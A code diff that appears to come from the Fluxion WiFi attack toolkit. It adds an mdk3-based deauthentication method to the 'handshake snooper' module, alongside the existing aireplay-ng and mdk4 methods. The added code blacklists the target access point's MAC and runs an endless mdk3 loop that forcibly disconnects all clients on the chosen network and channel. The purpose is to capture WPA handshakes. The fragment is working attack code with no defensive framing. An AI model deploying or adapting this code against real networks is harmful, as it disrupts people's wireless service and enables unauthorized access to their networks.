@@ -173,6 +173,8 @@ handshake_snooper_start_deauthenticator() {
 
   # Prepare deauthenticators
   case "$HandshakeSnooperDeauthenticatorIdentifier" in
+    "$HandshakeSnooperMdk3MethodOption")
+      echo "$FluxionTargetMAC" > $FLUXIONWorkspacePath/mdk3_blacklist.lst ;;
     "$HandshakeSnooperMdk4MethodOption")
       echo "$FluxionTargetMAC" > $FLUXIONWorkspacePath/mdk4_blacklist.lst ;;
   esac
@@ -183,6 +185,12 @@ handshake_snooper_start_deauthenticator() {
       xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
         -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
         "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
+      HandshakeSnooperDeauthenticatorPID=$!
+    ;;
+    "$HandshakeSnooperMdk3MethodOption")
+      xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+        -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+        "while true; do sleep 7; timeout 3 mdk3 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $FluxionTargetChannel; done" &
       HandshakeSnooperDeauthenticatorPID=$!
     ;;
     "$HandshakeSnooperMdk4MethodOption")
@@ -208,6 +216,7 @@ handshake_snooper_set_deauthenticator_identifier() {
   local methods=(
     "$HandshakeSnooperMonitorMethodOption"
     "$HandshakeSnooperAireplayMethodOption"
+    "$HandshakeSnooperMdk3MethodOption"
     "$HandshakeSnooperMdk4MethodOption"
     "$FLUXIONGeneralBackOption"
   )
